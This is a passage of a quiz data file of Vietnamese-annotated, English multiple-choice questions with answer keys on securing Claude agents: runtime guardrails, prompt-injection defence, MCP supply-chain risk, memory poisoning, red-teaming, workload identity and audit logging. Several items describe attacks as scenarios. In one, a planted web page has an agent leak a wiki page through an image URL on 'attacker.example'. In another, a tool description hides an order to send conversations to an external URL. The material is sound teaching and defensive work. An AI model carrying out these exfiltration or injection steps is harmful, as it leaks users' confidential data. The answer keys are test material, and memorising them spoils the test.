      "Least privilege (quyền tối thiểu) theo docs đó: chỉ mount thư mục cần, mạng chỉ tới endpoint cụ thể qua proxy, credential không đưa thẳng cho agent. Docs dặn đừng mount <code>~/.ssh</code>, <code>~/.aws</code>, nên chỉ chép đúng file nguồn cần.",
      "Proxy allowlist chặn mọi domain ngoài danh sách. Docs cũng nhắc: trong allowlist, agent gửi dữ liệu được tới mọi domain đã cho phép, nên chỉ cho đúng domain cần.",
      "Giới hạn thời gian chỉ chặn chạy quá lâu. Nó không cắt đường mạng, không thu credential."
    ],
    opts: [
      { k: "A", gist: "Run it in a container on the same network as production, but cap how long it can run.",
        why: [
          "Sai ở mạng: container chung mạng với production thì code vẫn với tới production (ý 1).",
          "Time limit (giới hạn thời gian) không thu hẹp quyền gì cả (ý 4). Vài giây là đủ gửi một request phá hoại."
        ] },
      { k: "B", gist: "Execute the code in an isolated sandbox that holds no production credentials and has no network route to production, restrict outbound traffic to an allowlist, and copy in only the data the task requires.",
        why: [
          "Đúng, đủ ba lớp: sandbox cô lập, không credential và không đường mạng tới production (ý 1, ý 2).",
          "Đi ra ngoài chỉ qua allowlist: tải trang công khai vẫn được, gửi dữ liệu tới chỗ lạ thì không (ý 3).",
          "Chỉ chép vào dữ liệu task cần: lỡ có chuyện thì thứ lộ ra cũng chỉ là phần đó."
        ] },
      { k: "C", gist: "Execute the code on the production application server using read-only database credentials.",
        why: [
          "Sai ở chỗ chạy: code chưa duyệt chạy thẳng trên server production (ý 1).",
          "Read-only (chỉ đọc) vẫn đọc được dữ liệu production, mà tải được trang web là có đường gửi nó đi. Code còn đụng được chính server đó.",
          "Dễ bị cuốn vì “read-only” nghe như đã thu quyền. Nhưng đề cấm rủi ro cho cả production lẫn credential, chỉ đọc vẫn là cầm credential production."
        ] },
      { k: "D", gist: "Execute the code in the developer's laptop environment, where their personal tokens are available.",
        why: [
          "Sai ở credential: token cá nhân thường có quyền rộng, đúng loại docs dặn đừng để agent thấy (ý 2).",
          "Máy dev cũng không phải môi trường cô lập: code đọc được file, khóa, phiên đăng nhập của người đó."
        ] }
    ],
    refs: [
      { label: "Docs Securely deploying AI agents, mục “Least privilege”: bảng giới hạn file, mạng, credential cho agent", href: "https://code.claude.com/docs/en/agent-sdk/secure-deployment#least-privilege" },
      { label: "Docs Securely deploying AI agents, mục “Containers”: chạy container không mạng, mount chỉ đọc, đừng mount thư mục chứa khóa của máy chủ", href: "https://code.claude.com/docs/en/agent-sdk/secure-deployment#containers" }
    ]
  },
  {
    de: 1, n: 83, total: 100, sub: "7.1", subName: "Guardrail lúc chạy",
    answer: "BD",
    ask: "A customer-facing assistant occasionally repeats personal data that shows up in tool results, and some of its requests get refused. The team is designing layered runtime guardrails. Which two measures belong in the design? (Choose two.)",
    scene: [
      "Trợ lý chăm sóc khách hàng, hai triệu chứng: đôi khi nhắc lại dữ liệu cá nhân lấy từ kết quả tool, và thỉnh thoảng bị từ chối (refusal).",
      "Team đang thiết kế guardrail nhiều lớp lúc chạy (layered runtime guardrails).",
      "Chỗ khó: mỗi triệu chứng cần một biện pháp riêng. Một cái chặn rò dữ liệu, một cái xử lý khi bị chặn hay bị từ chối."
    ],
    asks: [
      "Hai biện pháp nào nên có trong thiết kế?",
      "Tức là: một chốt chặn chắc chắn cho dữ liệu cá nhân ở đầu ra, và một cách xử lý định sẵn khi request bị từ chối hoặc output bị chặn."
    ],
    facts: [
      "Guardrail chắc chắn là lớp code chạy độc lập với model: model làm gì thì lớp đó vẫn kiểm. Lời dặn trong prompt chỉ làm giảm khả năng, không bảo đảm.",
      "Docs “Refusals and fallback”: khi model từ chối, API trả response bình thường (không phải lỗi) với <code>stop_reason: \"refusal\"</code>. App phải tự rẽ nhánh theo <code>stop_reason</code>.",
      "Cũng docs đó: gửi lại request bị từ chối cho cùng model thường lại bị từ chối. Docs chỉ cách dựng nhánh fallback định sẵn (ví dụ sang model fallback) và đếm refusal thành một tín hiệu riêng để theo dõi.",
      "Filter có giá trị vì nó chặn không ngoại lệ. Có đường lách (sửa lời tới khi lọt, tắt cho một nhóm khách) là filter mất tác dụng."
    ],
    opts: [
      { k: "A", gist: "Retry blocked requests with prompts reworded a little more each time until one gets past the filter.",
        why: [
          "Sai: sửa lời dần tới khi lọt là tự dò đường lách filter của chính mình (ý 4).",
          "Request lọt qua kiểu đó đúng là loại filter muốn chặn. Docs cũng không khuyên gửi lại cùng model cho tới khi được (ý 3).",
          "Dễ bị cuốn vì nghe như “retry” cho bền. Nhưng retry dành cho lỗi tạm thời, không dành cho chốt chặn an toàn."
        ] },
      { k: "B", gist: "Add an output stage that finds and redacts personal data before the response leaves the system.",
        why: [
          "Đúng: lớp đầu ra chặn dữ liệu cá nhân bằng code, trước khi câu trả lời rời hệ thống (ý 1).",
          "Model có lỡ chép lại dữ liệu từ kết quả tool thì lớp này vẫn bắt và che đi. Xử lý thẳng triệu chứng thứ nhất."
        ] },
      { k: "C", gist: "Depend on one sentence in the system prompt asking the model not to reveal personal data.",
        why: [
          "Sai: một câu trong prompt không phải chốt chặn (ý 1).",
          "Triệu chứng đang xảy ra là model vẫn nhắc lại dữ liệu. Thêm một lời dặn không bảo đảm nó dừng."
        ] },
      { k: "D", gist: "Define a safe fallback response and an escalation path for refusals and blocked outputs, instead of retrying until something passes.",
        why: [
          "Đúng cho triệu chứng thứ hai: refusal về như response bình thường, app phải có nhánh xử lý định sẵn (ý 2).",
          "Câu trả lời an toàn cho khách, chuyển sang người thật khi cần, thay vì gửi lại tới khi lọt (ý 3).",
          "Hành vi đoán trước được: khách không gặp câu trả lời lạ, team thấy được tần suất bị chặn."
        ] },
      { k: "E", gist: "Disable the output filter for premium customers so their experience stays smooth.",
        why: [
          "Sai: dữ liệu cá nhân không bớt nhạy cảm vì khách trả tiền nhiều hơn (ý 4).",
          "Tắt filter cho một nhóm là mở lại đúng lỗ rò mà B vừa chặn, mà lại cho nhóm khách quan trọng nhất."
        ] }
    ],
    refs: [
      { label: "Docs Refusals and fallback, mục “What a refusal looks like”: refusal là response bình thường với <code>stop_reason: \"refusal\"</code>, không phải lỗi", href: "https://platform.claude.com/docs/en/build-with-claude/refusals-and-fallback#refusal-response" },
      { label: "Docs Refusals and fallback, mục “Common pitfalls”: gửi lại cùng model thường lại bị từ chối, nên có nhánh fallback và đếm refusal riêng", href: "https://platform.claude.com/docs/en/build-with-claude/refusals-and-fallback#common-pitfalls" }
    ]
  },
  {
    de: 1, n: 84, total: 100, sub: "7.2", subName: "Phòng thủ tấn công và kiểm thử đối kháng",
    answer: "C",
    ask: "A research agent browses the web, can read an internal wiki, and can send HTTP requests, which includes fetching images by URL while it renders a report. A red team plants a web page telling the agent to read a confidential wiki page and encode its contents into an image URL on a domain the attacker controls. Which control most directly shuts this path?",
    scene: [
      "Agent nghiên cứu có ba thứ: duyệt web, đọc wiki nội bộ, gửi HTTP request (kể cả tải ảnh theo URL khi dựng báo cáo).",
      "Red team (đội tấn công thử) cài một trang web bảo agent đọc trang wiki mật rồi nhét nội dung vào URL ảnh trỏ về domain của kẻ tấn công. Ví dụ minh họa: <code>https://attacker.example/a.png?d=...</code>, phần sau <code>d=</code> là nội dung wiki. Tải ảnh là dữ liệu đã bay đi.",
      "Chỗ khó: ba phương án sai đều “làm gì đó”, nhưng chỉ một cái cắt được đường dữ liệu đi ra."
    ],
    asks: [
      "Biện pháp nào đóng đường này trực tiếp nhất?",
      "Tức là: dù trang web nói gì và model có nghe theo hay không, dữ liệu vẫn không ra được tới domain lạ."
    ],
    facts: [
      "Đường tấn công này cần đủ ba thứ cùng lúc: dữ liệu riêng tư (wiki), nội dung không tin được (trang web), và một kênh gửi ra ngoài (request tải ảnh). Cắt một thứ là đường gãy.",
      "Docs “Securely deploying AI agents”, mục “Threat model”: nếu agent đọc phải file độc bảo nó gửi dữ liệu khách hàng ra server ngoài, kiểm soát mạng chặn được hẳn request đó.",
      "Egress allowlist (danh sách được phép đi ra): chỉ domain trong danh sách mới nhận được request. Chặn ở tầng mạng và tầng render thì model có bị lừa cũng không mở được kênh.",
      "Docs “Mitigate jailbreaks and prompt injections”: ghi chính sách vào system prompt là một lớp, nhưng docs vẫn khuyên giới hạn quyền tối thiểu để lỡ bị lừa thì thiệt hại nhỏ nhất."
    ],
    opts: [
      { k: "A", gist: "Move the agent to a model with a bigger context window.",
        why: [
          "Sai: cửa sổ ngữ cảnh lớn hơn chẳng dính gì tới đường tấn công (ý 1).",
          "Agent vẫn đọc được wiki, vẫn tải được ảnh từ domain lạ."
        ] },
      { k: "B", gist: "Log every outbound request and review the logs once a week.",
        why: [
          "Sai ở chỗ chỉ phát hiện sau: log cho biết đã lộ gì, nhưng request vẫn đi (ý 3).",
          "Xem log mỗi tuần nghĩa là dữ liệu có thể nằm trong tay kẻ tấn công cả tuần trước khi ai biết."
        ] },
      { k: "C", gist: "Enforce an egress allowlist at the network and renderer level so the agent can't send requests to arbitrary domains, and narrow wiki access to what the task requires.",
        why: [
          "Đúng: allowlist ở tầng mạng và tầng render cắt kênh gửi ra, bất kể trang web viết gì (ý 1, ý 3).",
          "Đúng như docs mô tả: kiểm soát mạng chặn hẳn request mang dữ liệu ra ngoài (ý 2).",
          "Thu hẹp quyền đọc wiki về đúng phần task cần: lỡ còn kênh nào khác thì phần lộ ra cũng nhỏ (ý 4)."
        ] },
      { k: "D", gist: "Add a warning to the system prompt that web pages may contain malicious instructions.",
        why: [
          "Sai ở người giữ chốt: lời cảnh báo vẫn là lời dặn model, chữ cài cắm trong trang vẫn có thể thắng (ý 4).",
          "Dễ bị cuốn vì docs đúng là có khuyên ghi chính sách về nội dung không tin được vào system prompt. Nhưng đó là một lớp phụ, không “đóng” được đường đi."
        ] }
    ],
    refs: [
      { label: "Docs Securely deploying AI agents, mục “Threat model”: kiểm soát mạng chặn được request gửi dữ liệu ra server ngoài dù agent đã bị lừa", href: "https://code.claude.com/docs/en/agent-sdk/secure-deployment#threat-model" },
      { label: "Docs Sandboxing, mục “Network isolation”: lệnh trong sandbox không có đường mạng trực tiếp, proxy kiểm từng hostname theo danh sách cho phép", href: "https://code.claude.com/docs/en/sandboxing#network-isolation" },
      { label: "Docs Mitigate jailbreaks and prompt injections, mục “Indirect prompt injection”: quyền tối thiểu để lỡ bị chèn lệnh thì thiệt hại nhỏ", href: "https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks#indirect-prompt-injection" }
    ]
  },
  {
    de: 1, n: 85, total: 100, sub: "7.2", subName: "Phòng thủ tấn công và kiểm thử đối kháng",
    answer: "D",
    ask: "A team relies on a third-party MCP server. After a silent update, one tool's description now carries hidden text telling the model to send the conversation contents to an external URL whenever the tool is used. Which practice would have reduced this risk the most?",
    scene: [
      "Team dùng MCP server của bên thứ ba. Sau một lần cập nhật âm thầm, mô tả (description) của một tool có thêm chữ ẩn: bảo model gửi nội dung hội thoại tới một URL bên ngoài mỗi khi dùng tool.",
      "Phía team không đổi gì. Thứ độc đi vào qua chính bản cập nhật của server.",
      "Chỗ khó: đây là chuyện chuỗi cung ứng. Phải chặn từ lúc chọn server, lúc nó thay đổi, và giới hạn thứ nó làm được nếu đã lọt."
    ],
    asks: [
      "Cách làm nào lẽ ra giảm rủi ro này tốt nhất?",
      "Tức là: kiểm soát server nào được dùng, phát hiện khi định nghĩa tool đổi, và thu hẹp thiệt hại nếu vẫn lọt."
    ],
    facts: [
      "Mô tả tool là chữ model đọc để biết dùng tool thế nào, nên nó cũng là một kênh chèn lệnh. Spec MCP ghi: client phải coi annotation của tool là không tin được, trừ khi đến từ server tin cậy. Danh sách tool lấy từ server lúc chạy và có thể đổi.",
      "Docs Claude Code, mục “MCP security”: nên tự viết server hoặc dùng server của bên mày tin. Anthropic không kiểm toán bảo mật hay quản lý MCP server nào.",
      "Claude Code cho admin giới hạn server được chạy: <code>allowedMcpServers</code> cùng <code>allowManagedMcpServersOnly: true</code> trong managed settings là allowlist bắt buộc. Server stdio phải khớp đúng từng tham số của lệnh khởi động.",
      "Spec MCP khuyên client ghi log việc dùng tool cho mục đích audit. Log là thứ giúp phát hiện và điều tra lạm dụng."
    ],
    opts: [
      { k: "A", gist: "Trust whatever server is popular in public registries and allow it to auto-update.",
        why: [
          "Sai: phổ biến không có nghĩa đã được kiểm, và tự động cập nhật chính là đường bản độc đi vào (ý 2).",
          "Đúng kịch bản đề kể: một bản cập nhật âm thầm, không ai xem."
        ] },
      { k: "B", gist: "Turn off logging for MCP calls so sensitive content isn't exposed.",
        why: [
          "Sai hướng: tắt log là mất luôn khả năng phát hiện và điều tra (ý 4).",
          "Rủi ro là dữ liệu bị gửi ra ngoài, không phải log. Không có log thì vụ này có khi không bao giờ bị phát hiện."
        ] },
      { k: "C", gist: "Count on the model to ignore suspicious text in tool descriptions, and keep monitoring as it is.",
        why: [
          "Sai ở người giữ chốt: phán đoán của model không phải chốt chặn (ý 1).",
          "Chữ ẩn được viết ra để model làm theo. Giữ nguyên giám sát cũng không bắt được việc mô tả tool bị đổi.",
          "Dễ bị cuốn vì model đúng là có khả năng nhận ra lệnh lạ. Nhưng đề hỏi cách làm giảm rủi ro, mà “tin model” thì không kiểm chứng được."
        ] },
      { k: "D", gist: "Limit agents to an allowlist of vetted MCP servers, pin tool descriptions and review them per version, alert on any change, and restrict the server's permissions and network egress.",
        why: [
          "Đúng, đủ ba lớp: chỉ dùng server đã kiểm qua allowlist (ý 2, ý 3), chốt và duyệt mô tả tool theo phiên bản, báo động khi có thay đổi (ý 1).",
          "Thu hẹp quyền và đường mạng của server: lỡ bản độc lọt qua, dữ liệu cũng không tới được URL lạ."
        ] }
    ],
    refs: [
      { label: "Docs Claude Code Security, mục “MCP security”: dùng server tự viết hoặc của bên tin cậy, Anthropic không kiểm toán MCP server", href: "https://code.claude.com/docs/en/security#mcp-security" },
      { label: "Docs Control MCP server access, mục “Policy-based control with allowlists and denylists”: dựng allowlist server bắt buộc bằng managed settings", href: "https://code.claude.com/docs/en/managed-mcp#policy-based-control-with-allowlists-and-denylists" },
      { label: "Spec MCP Tools, mục “Tool”: client phải coi annotation của tool là không tin được nếu server không tin cậy", href: "https://modelcontextprotocol.io/specification/2025-06-18/server/tools#tool" }
    ]
  },
  {
    de: 1, n: 86, total: 100, sub: "7.2", subName: "Phòng thủ tấn công và kiểm thử đối kháng",
    answer: "A",
    ask: "An assistant writes notes to a long-term memory store, including facts it picks up while reading web pages. Weeks later, in unrelated sessions, it starts recommending an attacker's link as 'the official source'. The investigation shows a web page had told the agent to remember exactly that. What is the best structural mitigation?",
    scene: [
      "Trợ lý ghi chú vào bộ nhớ dài hạn, kể cả những “sự thật” nó rút ra khi đọc web.",
      "Vài tuần sau, ở những phiên chẳng liên quan, nó giới thiệu link của kẻ tấn công là “the official source” (nguồn chính thức). Điều tra ra: một trang web đã bảo agent ghi nhớ đúng điều đó.",
      "Chỗ khó: prompt injection không dừng ở một phiên. Bộ nhớ biến một lần bị lừa thành lỗi kéo dài, lan sang các phiên khác."
    ],
    asks: [
      "Biện pháp mang tính cấu trúc nào tốt nhất?",
      "Tức là: sửa cách bộ nhớ được ghi và được đọc lại, không phải dặn thêm model."
    ],
    facts: [
      "Memory tool chạy phía client: Claude chỉ yêu cầu thao tác file, app của mày mới thực hiện. Docs ghi mọi thao tác đều đi qua handler của mày, nên biện pháp an toàn là việc của mày, ví dụ kiểm và lọc trước khi ghi.",
      "Docs “Mitigate jailbreaks and prompt injections”: nội dung từ tool, tài liệu, web là dữ liệu không tin được, không được đè lên system prompt hay yêu cầu gốc của user. Docs khuyên nói rõ cho Claude nội dung là gì và đến từ đâu.",
      "Provenance (nguồn gốc): ghi lại mỗi mục nhớ đến từ đâu. Có nguồn gốc thì mới phân biệt được điều user dặn với điều một trang web lạ nói."
    ],
    opts: [
      { k: "A", gist: "Treat memory written from untrusted content as untrusted: record where each entry came from, require validation or approval for persistent writes that come from external sources, and keep untrusted memory separate from trusted instructions.",
        why: [
          "Đúng, sửa ở cấu trúc: ghi nguồn gốc cho từng mục (ý 3), mục đến từ nguồn ngoài phải qua kiểm hoặc duyệt trước khi lưu lâu dài (ý 1).",
          "Tách bộ nhớ không tin được khỏi chỉ dẫn tin được: lúc đọc lại, nó vẫn chỉ là dữ liệu, không thành lệnh (ý 2)."
        ] },
      { k: "B", gist: "Add a prompt instruction telling the model to doubt its own memories.",
        why: [
          "Sai: dặn model nghi ngờ trí nhớ vẫn là lời dặn, không phải chốt chặn (ý 2).",
          "Mục nhớ độc vẫn nằm đó, lại không có nguồn gốc để biết nên nghi mục nào (ý 3).",
          "Dễ bị cuốn vì nghe đúng tinh thần “coi bộ nhớ là không tin được”. Nhưng A làm điều đó bằng cấu trúc, B chỉ nói bằng lời."
        ] },
      { k: "C", gist: "Make the memory store larger so older entries get diluted, and keep monitoring as it is.",
        why: [
          "Sai: pha loãng không xóa được mục độc, đọc lại lúc nào nó vẫn có thể được lấy ra (ý 1).",
          "Giữ nguyên giám sát cũng không phát hiện được gì, vì cách ghi vẫn y như cũ."
        ] },
      { k: "D", gist: "Turn off memory entirely and never permit persistent state in any agent.",
        why: [
          "Sai vì quá tay: bỏ luôn giá trị thật của bộ nhớ thay vì kiểm soát rủi ro.",
          "Đề hỏi biện pháp giảm rủi ro cho trợ lý này, không hỏi cách cấm hẳn một tính năng cho mọi agent."
        ] }
    ],
    refs: [
      { label: "Docs Memory tool, mục “Security considerations”: mọi thao tác file đi qua app của mày, kiểm và lọc trước khi ghi là trách nhiệm của mày", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool#security-considerations" },
      { label: "Docs Mitigate jailbreaks and prompt injections, mục “Indirect prompt injection”: coi nội dung bên thứ ba là dữ liệu, nói rõ nó là gì và đến từ đâu", href: "https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks#indirect-prompt-injection" }
    ]
  },
  {
    de: 1, n: 87, total: 100, sub: "7.2", subName: "Phòng thủ tấn công và kiểm thử đối kháng",
    answer: "BE",
    ask: "A team is designing red-team exercises for a support agent with tools: it reads tickets and their attachments, queries a CRM, and sends emails. Which two design choices make the exercise worth the most? (Choose two.)",
    scene: [
      "Agent hỗ trợ có tool: đọc ticket và file đính kèm, tra CRM, gửi email.",
      "Team lên kế hoạch red-team (tấn công thử có chủ đích) để tìm lỗ hổng trước kẻ xấu.",
      "Chỗ khó: phải chọn đúng nơi tấn công đi vào (kênh nào), và giữ cho bài thử còn giá trị theo thời gian."
    ],
    asks: [
      "Hai lựa chọn thiết kế nào làm bài red-team có giá trị nhất?",
      "Tức là: thử đúng chỗ rủi ro thật nằm, và giữ kết quả lại để kiểm lại sau mỗi thay đổi."
    ],
    facts: [
      "Docs “Mitigate jailbreaks and prompt injections” chia hai mối đe dọa: jailbreak trực tiếp (user là kẻ tấn công) và indirect prompt injection (chèn lệnh gián tiếp: lệnh nằm trong nội dung bên thứ ba như email, tài liệu, kết quả tool).",
      "Cũng docs đó: trước khi triển khai, red-team agent bằng tài liệu, email, kết quả tool cố tình chứa lệnh cài cắm, rồi xác nhận Claude bỏ qua và các bước kiểm, bước xác nhận bắt được phần còn lại.",
      "Docs còn khuyên giám sát liên tục: thường xuyên soi output tìm dấu hiệu chèn lệnh thành công, rồi dùng kết quả để chỉnh prompt, bước kiểm và bộ lọc.",
      "Regression test (kiểm hồi quy): giữ lại ca từng làm hỏng hệ thống, chạy lại sau mỗi thay đổi để chắc lỗi cũ không quay lại."
    ],
    opts: [
      { k: "A", gist: "Give developers the attack list in advance so they can tune the prompts to those exact cases.",
        why: [
          "Sai: chỉnh prompt khớp đúng danh sách đã biết thì qua bài thử, nhưng không chống được biến thể mới.",
          "Kết quả đẹp mà giả: đo được độ thuộc bài, không đo được độ bền."
        ] },
      { k: "B", gist: "Plant realistic attack payloads in every untrusted channel the agent reads (tickets, attachments, tool results) and observe what actions follow.",
        why: [
          "Đúng: ticket, file đính kèm, kết quả CRM đều là nội dung bên thứ ba, đúng kênh chèn lệnh gián tiếp (ý 1).",
          "Quan sát hành động sinh ra, đúng như docs dặn khi red-team (ý 2). Agent gửi được email nên hành động mới là thứ cần đo."
        ] },
      { k: "C", gist: "Test only direct jailbreak attempts typed by the end user into the chat window.",
        why: [
          "Sai ở phạm vi: chỉ thử jailbreak gõ vào chat là bỏ qua kênh rủi ro lớn nhất của agent này (ý 1).",
          "Dễ bị cuốn vì jailbreak là kiểu tấn công quen nhất. Nhưng ở đây lệnh độc dễ nằm trong ticket hay file đính kèm hơn là trong khung chat."
        ] },
      { k: "D", gist: "Run the exercise once before launch and treat its results as permanent.",
        why: [
          "Sai: hệ thống đổi, kiểu tấn công đổi, kết quả một lần không đúng mãi (ý 3).",
          "Sau mỗi lần sửa prompt hay thêm tool, lỗ cũ có thể mở lại mà không ai biết."
        ] },
      { k: "E", gist: "Turn every successful attack into a regression test and repeat the exercise after each mitigation or major change.",
        why: [
          "Đúng: ca tấn công thành công thành bộ kiểm hồi quy, chạy lại sau mỗi bản vá hay thay đổi lớn (ý 4).",
          "Đúng tinh thần giám sát liên tục của docs: kết quả thử quay lại để chỉnh hệ thống, rồi thử lại (ý 3)."
        ] }
    ],
    refs: [
      { label: "Docs Mitigate jailbreaks and prompt injections, mục “Indirect prompt injection”: red-team agent bằng tài liệu, email, kết quả tool có lệnh cài cắm", href: "https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks#indirect-prompt-injection" },
      { label: "Docs Mitigate jailbreaks and prompt injections, mục “Continuous monitoring”: soi output thường xuyên, dùng kết quả để chỉnh lại các lớp phòng thủ", href: "https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks#continuous-monitoring" }
    ]
  },
  {
    de: 1, n: 88, total: 100, sub: "7.3", subName: "Danh tính, secret và audit",
    answer: "B",
    ask: "A CI pipeline calls Claude using a long-lived API key kept as a repository secret. The key has been copied into several forks, and rotating it is painful. Both the cloud and CI platforms can issue signed identity tokens to workloads. Which approach is best?",
    scene: [
      "Pipeline CI gọi Claude bằng một API key sống lâu (long-lived), cất trong secret của repo.",
      "Key đã bị chép sang nhiều fork, xoay vòng (rotate) thì cực. Nền tảng cloud và CI đều cấp được token danh tính có chữ ký cho workload (tác vụ đang chạy).",
      "Chỗ khó: vấn đề gốc là có một bí mật tĩnh sống lâu. Phương án nào còn giữ bí mật tĩnh thì chỉ là đổi chỗ cất."
    ],
    asks: [
      "Cách nào tốt nhất?",
      "Tức là: bỏ hẳn key tĩnh, để job tự chứng minh danh tính bằng token nền tảng cấp và nhận credential ngắn hạn."
    ],
    facts: [
      "Docs Claude Code GitHub Actions, mục “Set up for an organization”: muốn khỏi lưu secret sống lâu thì xác thực qua workload identity federation. Action đổi token OIDC (OpenID Connect) của workflow GitHub lấy quyền gọi Claude API qua một service account trên Claude Console.",
      "Cũng docs đó: workflow cần quyền <code>id-token: write</code> cho bước đổi token, cấu hình bằng các input như <code>anthropic_federation_rule_id</code> và <code>anthropic_organization_id</code>.",
      "Docs “Securely deploying AI agents”: credential nên nằm ở một chỗ an toàn thay vì rải cho từng agent, và service account của agent trên cloud chỉ nên có quyền IAM tối thiểu.",
      "Bí mật tĩnh lộ lúc nào thì dùng được tới lúc bị xoay. Xoay định kỳ chỉ rút ngắn khoảng đó, không xóa nó."
    ],
    opts: [
      { k: "A", gist: "Have each developer put a personal key in the CI job so usage can be attributed.",
        why: [
          "Sai: thêm key cá nhân là nhân số bí mật sống lâu lên, lại buộc CI vào từng người (ý 4).",
          "Người nghỉ việc thì job gãy. Key cá nhân cũng thường có quyền rộng hơn việc CI cần."
        ] },
      { k: "B", gist: "Use workload identity federation: the job presents its short-lived, platform-issued identity token and exchanges it for scoped, short-lived credentials, leaving no static key to leak or rotate.",
        why: [
          "Đúng: không còn key tĩnh để lộ hay xoay, job dùng token danh tính ngắn hạn do nền tảng cấp (ý 1).",
          "Credential nhận về có phạm vi hẹp, hết hạn nhanh, gắn với danh tính workload chứ không với ai đang cầm key (ý 3).",
          "Đúng cách docs GitHub Actions mô tả cho Claude API: token OIDC đổi lấy quyền qua service account (ý 1, ý 2)."
        ] },
      { k: "C", gist: "Bake the key into the container image so forks can't reach repository secrets.",
        why: [
          "Sai: key nằm trong image thì ai kéo được image là đọc được key.",
          "Còn tệ hơn hiện tại: image hay được đẩy lên registry, lưu cache, chép đi nhiều nơi."
        ] },
      { k: "D", gist: "Keep the static key but rotate it monthly and store it in a team password manager.",
        why: [
          "Sai ở gốc: vẫn là bí mật tĩnh, lộ giữa hai lần xoay thì vẫn bị dùng (ý 4).",
          "Dễ bị cuốn vì xoay định kỳ và password manager nghe như “làm đúng quy trình”. Nhưng đề đã nói nền tảng có token danh tính, tức là bỏ hẳn được key."
        ] }
    ],
    refs: [
      { label: "Docs Claude Code GitHub Actions, mục “Set up for an organization”: workload identity federation đổi token OIDC lấy quyền gọi Claude API, khỏi lưu secret sống lâu", href: "https://code.claude.com/docs/en/github-actions#set-up-for-an-organization" },
      { label: "Docs Securely deploying AI agents, mục “Credential management”: giữ credential ngoài tầm agent và ở một chỗ an toàn", href: "https://code.claude.com/docs/en/agent-sdk/secure-deployment#credential-management" }
    ]
  },
  {
    de: 1, n: 89, total: 100, sub: "7.3", subName: "Danh tính, secret và audit",
    answer: "C",
    ask: "Auditors want to know how the team would reconstruct what an autonomous agent did on a user's behalf if a data incident happened. Which audit design is best?",
    scene: [
      "Kiểm toán viên hỏi: nếu có sự cố dữ liệu, team có dựng lại được agent tự động đã làm gì thay mặt user không?",
      "Chỗ khó: cần bản ghi đáng tin và quy được trách nhiệm (ai yêu cầu, agent nào làm, làm gì, ai duyệt), mà không biến chính bản ghi thành chỗ rò secret."
    ],
    asks: [
      "Thiết kế audit nào tốt nhất?",
      "Tức là: ghi hành động chứ không chỉ lời qua lại, gắn danh tính, khó sửa, và không chứa secret.",
      "Soi từng phương án: có đủ hành động không, tin được không, quy được cho ai không."
    ],
    facts: [
      "Bản ghi audit phải trả lời được: hành động gì, tham số gì, ai yêu cầu, agent nào làm, ai duyệt hay chặn. Các lần đọc dữ liệu thành công chính là thứ điều tra rò rỉ cần nhất.",
      "Ví dụ trong Claude Code: OpenTelemetry có sự kiện <code>tool_decision</code> ghi mỗi lần chấp nhận hay từ chối một tool cùng nguồn quyết định (config, hook, user). Sự kiện mang thuộc tính danh tính như <code>user.email</code>, <code>organization.id</code>, <code>session.id</code>.",
      "Cũng docs đó: nội dung prompt bị che mặc định, tham số tool chỉ ghi khi bật <code>OTEL_LOG_TOOL_DETAILS=1</code>. Admin khóa được đích nhận telemetry bằng managed settings.",
      "Spec MCP khuyên client ghi log việc dùng tool cho mục đích audit."
    ],
    opts: [
      { k: "A", gist: "Log only failed requests, because successful ones don't matter for security.",
        why: [
          "Sai: thao tác thành công, như đọc dữ liệu, mới là thứ điều tra sự cố cần (ý 1).",
          "Agent đọc trộm hay gửi dữ liệu đi đều là request “thành công”. Chỉ log lỗi là mất đúng phần quan trọng."
        ] },
      { k: "B", gist: "Rely on keeping the model's conversation transcripts, since they hold everything, and leave current monitoring unchanged.",
        why: [
          "Sai: transcript là lời qua lại với model, không phải bản ghi chính thức của hành động đã thực thi (ý 1).",
          "Nó còn có thể chứa dữ liệu nhạy cảm, không gắn danh tính rõ ràng, và dễ bị sửa.",
          "Dễ bị cuốn vì “chứa mọi thứ” nghe như đủ. Nhưng thứ kiểm toán cần là hành động đã chạy, ai duyệt, credential nào được dùng."
        ] },
      { k: "C", gist: "Maintain tamper-resistant logs of security-relevant actions (tool calls with their parameters or hashes, approvals, denials, credential use), linked to the agent's identity and the requesting user, without ever recording secrets.",
        why: [
          "Đúng: ghi đúng các hành động liên quan an toàn, kèm tham số hoặc hash, và quyết định duyệt hay chặn (ý 1, ý 2).",
          "Gắn danh tính agent và user yêu cầu nên quy được trách nhiệm. Khó sửa nên tin được khi điều tra.",
          "Không ghi secret, dùng hash cho tham số nhạy cảm: log không thành chỗ rò mới (ý 3)."
        ] },
      { k: "D", gist: "Have the agent summarize its own actions at the end of every run.",
        why: [
          "Sai: bản tự khai có thể sai, và agent bị lừa thì bản tự khai cũng bị lừa theo.",
          "Kẻ tấn công chèn lệnh được vào agent thì cũng bảo được nó viết một bản tóm tắt vô hại."
        ] }
    ],
    refs: [
      { label: "Docs Monitoring, mục “Tool decision event”: sự kiện ghi mỗi lần chấp nhận hay từ chối tool và nguồn quyết định", href: "https://code.claude.com/docs/en/monitoring-usage#tool-decision-event" },
      { label: "Docs Monitoring, mục “Standard attributes”: thuộc tính danh tính user, tổ chức, phiên gắn vào mọi sự kiện", href: "https://code.claude.com/docs/en/monitoring-usage#standard-attributes" },
      { label: "Spec MCP Tools, mục “Security Considerations”: client nên ghi log việc dùng tool cho mục đích audit", href: "https://modelcontextprotocol.io/specification/2025-06-18/server/tools#security-considerations" }
    ]
  },
  {
    de: 1, n: 90, total: 100, sub: "7.3", subName: "Danh tính, secret và audit",
    answer: "DE",
    ask: "A team runs several agents that share one administrator-level service credential, and that credential is also written into the system prompts so the agents can authenticate to tools. Which two changes improve identity and secrets practice the most? (Choose two.)",
    scene: [
      "Nhiều agent dùng chung một credential service cấp admin.",
      "Tệ hơn: credential đó được viết thẳng vào system prompt để agent xác thực với tool.",
      "Chỗ khó: có hai lỗi riêng. Một là danh tính dùng chung với quyền quá rộng, hai là secret nằm trong ngữ cảnh của model. Cần một phương án cho mỗi lỗi."
    ],
    asks: [
      "Hai thay đổi nào cải thiện tốt nhất cách quản lý danh tính và secret?",
      "Tức là: mỗi agent một danh tính với quyền vừa đủ, và secret không bao giờ đi vào ngữ cảnh model."
    ],
    facts: [
